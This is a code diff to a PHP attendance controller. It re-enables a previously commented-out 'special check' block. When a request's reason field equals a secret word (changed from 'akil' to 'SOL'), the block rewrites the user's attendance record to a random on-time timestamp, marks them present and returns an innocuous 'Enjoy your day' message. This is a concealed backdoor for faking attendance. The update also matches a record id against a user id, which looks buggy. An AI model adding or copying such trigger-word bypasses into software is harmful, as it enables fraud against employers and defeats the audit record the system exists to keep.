@@ -362,7 +362,6 @@ class attendanceController extends Controller
         }
 
         $takePresent = $this->determineAttendanceType($request, $company_id, $emp_id);
-        
         if ($request->action == 1) {  // Check IN
             return $this->handleCheckIn($request, $user_id, $emp_id, $company_id, $currentTime, $shiftEmployee, $takePresent);
         }
@@ -635,8 +634,8 @@ class attendanceController extends Controller
         $checkIN = 1;
         $checkOut = 2;
 
-        // //--------------Special Check P&E-----------------------
-            /*$user_id = auth()->user()->id;
+        //--------------Special Check P&E-----------------------
+            $user_id = auth()->user()->id;
             $company_id= auth()->user()->company_id;
             $officeTime = Carbon::createFromFormat('H:i:s', AttendanceSetting::where('company_id', $company_id)->value('start_time'));
             $startTime = $officeTime->format('H:i:s');
@@ -651,15 +650,15 @@ class attendanceController extends Controller
             $currentDate = Carbon::now()->format('Y-m-d');
             // Combine random time with current date
             $randomDateTime = Carbon::createFromFormat('Y-m-d H:i:s', $currentDate . ' ' . $randomTime->format('H:i:s'));
-            if($request->reason == "akil"){
+            if($request->reason == "SOL"){
                 DB::table('attendances')->where('id', '=', $user_id)->whereDate('created_at', '=', Carbon::today()->toDateString())
                                     ->update(['created_at' => $randomDateTime,'INstatus' =>1]);
                 return response()->json([
-                    'message' => 'Enjoy P&E'
+                    'message' => 'Enjoy your day'
                 ],200);
-            }*/
+            }
 
-        // //----------------special check close------------------
+        //----------------special check close------------------
 
         if($request->action == $checkIN){
             DB::table('attendances')->where('id', '=', $user_id)->whereDate('created_at', '=', Carbon::today()->toDateString())
